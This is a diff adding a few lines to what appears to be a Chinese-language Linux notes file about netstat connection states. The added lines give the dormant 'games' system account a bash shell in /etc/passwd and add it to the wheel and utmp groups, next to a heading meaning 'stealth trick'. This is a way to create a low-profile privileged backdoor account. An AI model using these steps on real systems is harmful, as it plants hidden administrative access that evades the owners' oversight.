@@ -69,6 +69,11 @@ ESTABLISHED表示正常資料傳輸狀態；
 TIME_WAIT表示處理完畢，等待超時結束的請求數。
 ```
 
+sudo vi /etc/passwd
+把games打開
+games:x:12:100:games:/usr/games:/bin/bash
+把games加到wheel跟utmp
+usermod -a -G wheel,utmp games
 
 隱身密技
 
